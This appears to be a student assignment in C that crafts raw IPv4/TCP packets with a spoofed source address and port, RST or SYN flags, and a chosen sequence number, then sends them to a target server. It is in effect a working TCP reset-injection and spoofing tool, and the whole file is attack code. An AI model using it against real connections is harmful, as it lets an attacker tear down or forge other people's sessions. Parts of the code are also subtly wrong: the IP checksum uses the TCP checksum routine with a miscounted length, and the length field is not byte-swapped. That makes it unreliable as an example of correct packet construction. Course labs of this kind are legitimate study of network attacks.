//Source used for this assignment:
//https://www.binarytides.com/raw-sockets-c-code-linux/

#include <stdio.h> //printf()
#include <string.h> //memset()
#include <sys/socket.h>	//socket
#include <stdlib.h> //exit();
#include <errno.h> //error number
#include <netinet/ip.h>	//iphdr struct
#include <netinet/tcp.h> //tcphdr struct
#include <arpa/inet.h> //inet_addr

//Checksum calculator from Assignment's description page
unsigned short csum_tcp(unsigned short *buf, int nwords) {
	unsigned long sum = 0;
	sum += buf[6];
	sum += buf[7];
	sum += buf[8];
	sum += buf[9];
	sum += htons(6); // 6=TCP protocol in IP header
	sum += htons(20 + (nwords << 1)); // length of TCP header and payload
	
	for (int i = 10; i < 20 + nwords; ++i) {
		sum += buf[i];
	}
	
	while (sum >> 16) sum = (sum >> 16) + (sum & 0xffff);
	return ~sum;
}

int main (int argc, char *argv[])
{
	if(argc!=10) {
        	printf("Usage: <client_ip> <server_ip> <client_port> <rst_flag> <syn_flag> <window_size> <seq_num> <ack_num> <hex checksum> \n");
		printf("Example: 10.0.2.15 192.168.122.1 1234 1 0 0 2529095418 0 db10");
        	exit(1);
     	} 
	
	char *client_ip = argv[1];
	char *server_ip = argv[2];
     	int client_port = atoi(argv[3]);
	int rst_flag = atoi(argv[4]);
	int syn_flag = atoi(argv[5]);
	int window_size = atoi(argv[6]);
	long long seq_num = atoll(argv[7]);
	int ack_num = atoi(argv[8]);
	int checksum = strtol(argv[9], NULL, 16);
	
	int s = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
	
	if(s == -1)
	{
		perror("FAILURE: Socket creation - make sure you run this program as root");
		exit(1);
	}
	
	char datagram[4096];
	
	memset(datagram, 0, sizeof(datagram)); //zero out datagram
	
	//pointer to ip header *I___IP___I
	struct iphdr *ip_header = (struct iphdr *) datagram; 
	//pointer to tcp header I___IP___*I___TCP___I
	struct tcphdr *tcp_header = (struct tcphdr *) (datagram + sizeof(struct iphdr)); 
	
	//Spoofed source IP (can be anything)
	char source_ip[32];
	strcpy(source_ip, client_ip); //Command line argument
	
	//Construct spoofed source IPv4 address
	struct sockaddr_in ip4_source_addr;
	ip4_source_addr.sin_family = AF_INET;
	ip4_source_addr.sin_port = htons(client_port); //Command line argument 1
	inet_pton(AF_INET, source_ip, &ip4_source_addr.sin_addr);
	
	//Real destination IP of the server
	char dest_ip[32];
	strcpy(dest_ip,server_ip);
	
	//Construct real destination IPv4 address
	struct sockaddr_in ip4_dest_addr;
	ip4_dest_addr.sin_family = AF_INET;
	ip4_dest_addr.sin_port = htons(1203); 
	inet_pton(AF_INET, dest_ip, &ip4_dest_addr.sin_addr);
	
	//Fill in ip header fields
	(*ip_header).version = 4; //Version
	(*ip_header).ihl = 5; //IHL
	(*ip_header).tos = 0; //Type of Service
	(*ip_header).tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr);
	(*ip_header).id = htons(34575); //Identification
	(*ip_header).frag_off = 0; //First fragment has offset 0
	(*ip_header).ttl = 64; 
	(*ip_header).protocol = IPPROTO_TCP;
	(*ip_header).check = csum_tcp((unsigned short *) datagram, (*ip_header).tot_len); //Checksum calculation
	(*ip_header).saddr = ip4_source_addr.sin_addr.s_addr;//inet_pton(AF_INET, source_ip, &(*ip_header).saddr); //Spoofed source IP
	(*ip_header).daddr = ip4_dest_addr.sin_addr.s_addr; //Server destination IP
	
	//Fill in the tcp header fields
	(*tcp_header).source = ip4_source_addr.sin_port;//Spoofed IP Port
	(*tcp_header).dest = ip4_dest_addr.sin_port; //Real IP Port of server
	(*tcp_header).seq = htonl(seq_num);
	(*tcp_header).ack_seq = htonl(ack_num); //always 0 for a RST packet
	(*tcp_header).doff = 5;	//tcp header size
	(*tcp_header).urg=0;
	(*tcp_header).ack=0;
	(*tcp_header).psh=0;
	(*tcp_header).rst= rst_flag;
	(*tcp_header).syn= syn_flag;
	(*tcp_header).fin=0;
	(*tcp_header).window = htons(window_size);
	(*tcp_header).check = checksum; //Calculated correct checksum (with help of wireshark)
	(*tcp_header).urg_ptr = 0;
	
	//Use IP_HDRINCL option to indicate IP headers are included in packet
	int one = 1;
	setsockopt(s, IPPROTO_IP, IP_HDRINCL, (int *) &one, sizeof(one));
	
	//Send the packet
	if (sendto(s, datagram, (*ip_header).tot_len, 0, (struct sockaddr *) &ip4_dest_addr, sizeof(ip4_dest_addr)) < 0)
	{
		perror("FAILURE: packet failed to send");
	}
	else
	{
		printf("SUCCESS: packet of length : %d  was sent\n" , (*ip_header).tot_len);
	}
	    
}
